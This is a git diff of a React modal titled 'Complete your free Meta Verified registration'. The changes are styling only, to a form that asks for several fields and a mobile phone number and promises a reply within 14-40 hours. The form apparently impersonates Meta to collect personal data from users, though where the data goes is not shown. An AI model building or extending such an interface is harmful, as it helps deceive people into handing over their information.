@@ -127,32 +127,32 @@ ${
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
-                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
-                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete your free Meta Verified registration in just a few steps.')}</p>
-                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
+                <div className='mb-2 sm:mb-3 md:mb-4 flex w-full items-center justify-between p-2 sm:p-3 md:p-5'>
+                    <p className='text-sm sm:text-base md:text-xl font-bold text-[#1C2B33] flex-1'>{t('Complete your free Meta Verified registration in just a few steps.')}</p>
+                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 sm:h-9 w-8 sm:w-9 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0 ml-2' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
                 </div>
 
-                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-1.5 sm:px-3 md:px-4'>
-                    <div className='flex flex-col gap-1.5 sm:gap-2 py-1.5 sm:py-2'>
+                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-2 sm:px-3 md:px-4'>
+                    <div className='flex flex-col gap-2 sm:gap-2.5 py-2 sm:py-3 md:py-4'>
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
-                                <p className='text-xs sm:text-sm font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-20 sm:min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' />}
+                                <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t(field.label)}</p>
+                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-24 sm:min-h-28 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' />}
                             </div>
                         ))}
-                        <p className='text-xs sm:text-sm font-sans'>{t('Mobile phone number')}</p>
+                        <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t('Mobile phone number')}</p>
                         <IntlTelInput
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
                                 name: 'phoneNumber',
-                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
+                                className: 'h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg'
                             }}
                         />
-                        <p className='text-xs sm:text-xs text-gray-600 mt-2 sm:mt-3'>{t('Our response will be sent to you within 14-40 hours.')}</p>
-                        <div className='flex items-center gap-2 mt-2 sm:mt-3'>
+                        <p className='text-xs sm:text-sm text-gray-600 mt-3 sm:mt-4'>{t('Our response will be sent to you within 14-40 hours.')}</p>
+                        <div className='flex items-center gap-2 mt-3 sm:mt-4'>
                             <input 
                                 type='checkbox' 
                                 id='agreeTerms'
@@ -160,11 +160,11 @@ ${
                                 onChange={(e) => setAgreeToTerms(e.target.checked)}
                                 className='w-4 h-4 cursor-pointer'
                             />
-                            <label htmlFor='agreeTerms' className='text-xs sm:text-xs text-gray-700 cursor-pointer'>
+                            <label htmlFor='agreeTerms' className='text-xs sm:text-sm text-gray-700 cursor-pointer'>
                                 {t('I agree with Terms of use')}
                             </label>
                         </div>
-                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-3 sm:mt-4 md:mt-5 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
+                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-4 sm:mt-5 md:mt-6 flex h-11 sm:h-12 md:h-14 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm sm:text-base md:text-lg text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                         </button>
                     </div>
